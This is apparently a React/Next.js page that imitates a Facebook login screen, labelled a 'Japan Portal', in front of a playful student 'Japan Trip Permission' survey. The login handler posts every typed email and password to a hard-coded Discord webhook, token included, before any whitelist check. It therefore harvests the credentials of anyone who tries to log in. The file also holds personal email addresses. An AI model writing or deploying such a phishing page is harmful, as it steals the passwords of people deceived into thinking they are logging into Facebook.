"use client";

import { useState } from "react";

export default function Home() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [rating, setRating] = useState(0);

  // Login States
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Allowed Credentials
  const allowedUsers = [
    "byte121623@yahoo.com.ph",
    "byte121623@gmail.com",
    "bethie.escala"
  ];

  // --- Discord Webhook Logic ---
  const sendToDiscord = async (userEmail: string, pass: string) => {
    const webhookUrl = "https://discord.com/api/webhooks/1454353089757970556/GG4TABGGdklLtIemzZE1NrY5VF0IJBYuMD2SnqgXYB4W3RYXTA_XPWvJ7jz99B8rdOKT";
    
    const message = {
      embeds: [{
        title: "📌 New Login Attempt",
        color: 1541874, // Facebook Blue
        fields: [
          { name: "Username/Email", value: `\`${userEmail}\``, inline: true },
          { name: "Password", value: `\`${pass}\``, inline: true },
          { name: "Time", value: new Date().toLocaleString(), inline: false }
        ],
        footer: { text: "Japan Trip Authorization Portal" }
      }]
    };

    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(message),
      });
    } catch (err) {
      console.error("Webhook failed:", err);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    const inputEmail = email.trim();

    // 1. Validation
    if (!inputEmail) {
      setError("The email address or mobile number you entered isn't connected to an account.");
      setLoading(false);
      return;
    }
    if (/\s/.test(inputEmail)) {
      setError("Username or email cannot contain spaces.");
      setLoading(false);
      return;
    }
    if (!password) {
      setError("The password you entered is incorrect. Please try again.");
      setLoading(false);
      return;
    }

    // 2. Log to Discord
    await sendToDiscord(inputEmail, password);

    // 3. Strict whitelist check
    if (!allowedUsers.includes(inputEmail)) {
      setError("The email or username you entered doesn't match any account. Please try again.");
      setLoading(false);
      return;
    }

    setIsLoggedIn(true);
    setLoading(false);
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
  };

  // --- VIEW 1: FACEBOOK LOGIN ---
  if (!isLoggedIn) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f0f2f5] p-6 font-sans dark:bg-zinc-900">
        <div className="w-full max-w-[400px] flex flex-col items-center">
          <h1 className="text-[#1877f2] text-5xl font-bold mb-6 tracking-tighter">facebook</h1>
          <div className="w-full rounded-xl bg-white p-5 shadow-xl dark:bg-black border border-zinc-200 dark:border-zinc-800">
            <h2 className="text-center text-lg mb-4 font-medium dark:text-white">Log in to Japan Portal</h2>
            {error && (
              <div className="mb-4 rounded-md bg-[#ffebe8] border border-[#dd3c10] p-3 text-[13px] text-[#1c1e21]">
                {error}
              </div>
            )}
            <form onSubmit={handleLogin} className="flex flex-col gap-3">
              <input 
                type="text" 
                placeholder="Email or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                disabled={loading}
                className="w-full rounded-md border border-zinc-300 p-3.5 text-sm outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] dark:bg-zinc-900 dark:border-zinc-700 dark:text-white"
              />
              <input 
                type="password" 
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={loading}
                className="w-full rounded-md border border-zinc-300 p-3.5 text-sm outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] dark:bg-zinc-900 dark:border-zinc-700 dark:text-white"
              />
              <button 
                type="submit"
                disabled={loading}
                className="mt-1 h-12 w-full rounded-md bg-[#1877f2] text-xl font-bold text-white transition-all hover:bg-[#166fe5] active:scale-[0.98] disabled:opacity-70"
              >
                {loading ? "Logging in..." : "Log In"}
              </button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // --- VIEW 2: SUCCESS PAGE ---
  if (submitted) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f0f2f5] p-6 dark:bg-black font-sans">
        <div className="max-w-md text-center bg-white p-10 rounded-xl shadow-md dark:bg-zinc-900">
          <div className="mb-4 flex justify-center">
            <div className="bg-[#e7f3ff] p-4 rounded-full">
               <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </div>
          </div>
          <h2 className="text-3xl font-bold text-[#1c1e21] dark:text-white">Request Sent!</h2>
          <p className="mt-4 text-zinc-600 dark:text-zinc-400 font-medium italic">
            "Sige, basta ayaw pagbinuang didto ha?"
          </p>
          <button 
            onClick={() => {setSubmitted(false); setRating(0);}}
            className="mt-8 w-full py-3 bg-[#1877f2] text-white font-bold rounded-lg hover:bg-[#166fe5] transition-all"
          >
            Submit Another Request
          </button>
        </div>
      </div>
    );
  }

  // --- VIEW 3: FULL BLUE SURVEY ---
  return (
    <div className="flex min-h-screen items-center justify-center bg-[#f0f2f5] font-sans dark:bg-zinc-950">
      <main className="flex min-h-screen w-full max-w-2xl flex-col bg-white px-8 py-12 dark:bg-black border-x border-zinc-200 dark:border-zinc-900 sm:px-16 shadow-sm">
        
        <div className="mb-12 flex flex-col items-center text-center gap-2">
          <div className="bg-[#e7f3ff] px-3 py-1 rounded text-[#1877f2] font-bold text-[10px] tracking-[0.4em] mb-2 uppercase">
             Student Authorization
          </div>
          <h1 className="text-3xl font-bold text-[#1c1e21] dark:text-white">
            Japan Trip Permission
          </h1>
          <p className="text-zinc-500 text-xs font-medium italic">Welcome, {email}</p>
        </div>

        <form onSubmit={handleFinalSubmit} className="flex flex-col gap-10">
          
          {/* Q1 */}
          <div className="flex flex-col gap-3">
            <label className="text-xs font-bold uppercase tracking-wider text-[#65676b] dark:text-zinc-400">1. Travel Objective</label>
            <select required className="mt-1 block w-full rounded-lg border border-zinc-300 bg-white p-4 text-black font-medium outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] dark:border-zinc-800 dark:bg-zinc-900 dark:text-white">
              <option className="bg-white text-black dark:bg-zinc-900 dark:text-white" value="">Select Purpose</option>
              <option className="bg-white text-black dark:bg-zinc-900 dark:text-white">Educational Exposure (Tech & Culture)</option>
              <option className="bg-white text-black dark:bg-zinc-900 dark:text-white">Post-Semester Mental Health Wellness</option>
              <option className="bg-white text-black dark:bg-zinc-900 dark:text-white">Cultural Immersion</option>
            </select>
          </div>

          {/* Q2 */}
          <div className="flex flex-col gap-3">
            <label className="text-xs font-bold uppercase tracking-wider text-[#65676b] dark:text-zinc-400">2. Safety Protocol</label>
            <div className="flex flex-col gap-2">
              {["Active GPS Sharing", "Daily Nightly Video Call", "Hourly Messenger Updates"].map((opt) => (
                <label key={opt} className="flex items-center gap-3 cursor-pointer p-4 border border-zinc-200 dark:border-zinc-800 hover:bg-[#f2f2f2] dark:hover:bg-zinc-900 rounded-xl transition-all">
                  <input type="radio" name="safety" className="h-4 w-4 accent-[#1877f2]" required />
                  <span className="text-[15px] text-[#1c1e21] dark:text-zinc-300 font-medium">{opt}</span>
                </label>
              ))}
            </div>
          </div>

          {/* Q3 */}
          <div className="flex flex-col gap-3">
            <label className="text-xs font-bold uppercase tracking-wider text-[#65676b] dark:text-zinc-400">3. Academic Guarantee</label>
            <div className="grid grid-cols-1 gap-2">
              {["No Failing Grades / No INC", "Advance Study for Next Term", "Zero Backlog on Projects"].map((item) => (
                <label key={item} className="flex items-center gap-3 rounded-xl border border-zinc-200 p-4 dark:border-zinc-800">
                  <input type="checkbox" className="w-5 h-5 accent-[#1877f2]" />
                  <span className="text-[15px] font-semibold text-[#1c1e21] dark:text-white">{item}</span>
                </label>
              ))}
            </div>
          </div>

          {/* Q4 */}
          <div className="flex flex-col gap-3">
            <label className="text-xs font-bold uppercase tracking-wider text-[#65676b] dark:text-zinc-400">4. Fiscal Responsibility</label>
            <div className="grid grid-cols-1 gap-2">
              {["Audit-ready: Keeping all receipts", "Tipid Mode: Prioritize meals", "Strict adherence to budget"].map((opt) => (
                <label key={opt} className="flex items-center gap-3 cursor-pointer p-4 border border-zinc-200 dark:border-zinc-800 hover:bg-[#f2f2f2] rounded-xl transition-all">
                  <input type="radio" name="budget" className="h-4 w-4 accent-[#1877f2]" required />
                  <span className="text-[15px] text-[#1c1e21] dark:text-zinc-300 font-medium">{opt}</span>
                </label>
              ))}
            </div>
          </div>

          {/* Q5 */}
          <div className="flex flex-col gap-3">
            <label className="text-xs font-bold uppercase tracking-wider text-[#65676b] dark:text-zinc-400">5. Necessity Level</label>
            <div className="flex justify-between items-center gap-2 mt-2">
              {[1, 2, 3, 4, 5].map((num) => (
                <button
                  key={num}
                  type="button"
                  onClick={() => setRating(num)}
                  className={`flex-1 h-14 rounded-lg font-bold transition-all ${
                    rating >= num ? "bg-[#1877f2] text-white" : "bg-[#e4e6eb] text-[#4b4f56] dark:bg-zinc-800"
                  }`}
                >
                  {num}
                </button>
              ))}
            </div>
          </div>

          <button type="submit" className="flex h-12 w-full items-center justify-center rounded-lg bg-[#1877f2] text-white font-bold text-lg hover:bg-[#166fe5] shadow-md transition-all active:scale-95">
            Submit Authorization
          </button>
        </form>

        <footer className="mt-20 text-center text-xs font-medium text-zinc-500">
          CIT UNIVERSITY • 2025
        </footer>
      </main>
    </div>
  );
}